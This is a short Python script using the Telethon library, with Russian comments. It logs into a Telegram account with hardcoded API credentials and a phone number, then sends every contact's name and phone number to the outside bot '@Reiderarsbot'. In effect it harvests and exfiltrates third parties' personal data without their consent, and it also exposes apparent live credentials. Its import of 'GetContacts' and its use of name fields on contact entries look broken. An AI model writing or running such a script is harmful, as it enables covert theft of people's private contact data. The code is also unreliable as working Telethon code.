from telethon import TelegramClient
from telethon.tl.functions.contacts import GetContacts
from telethon.tl.functions.messages import SendMessage
import asyncio

# Замените на ваши данные
API_ID = '22033302'
API_HASH = '522596c0b5c29485d238e531ed87ec83'
PHONE = '+79656582070'
TARGET_BOT_USERNAME = '@Reiderarsbot'

client = TelegramClient('userbot', API_ID, API_HASH)

async def send_contacts():
    await client.start()
    
    # Получение контактных данных
    contacts = await client(GetContacts())
    
    for contact in contacts.contacts:
        # Проверка, что это объектный контакт
        if contact.first_name and contact.last_name:
            await client.send_message(TARGET_BOT_USERNAME, f"Контакт: {contact.first_name} {contact.last_name} - {contact.phone}")

with client:
    client.loop.run_until_complete(send_contacts())
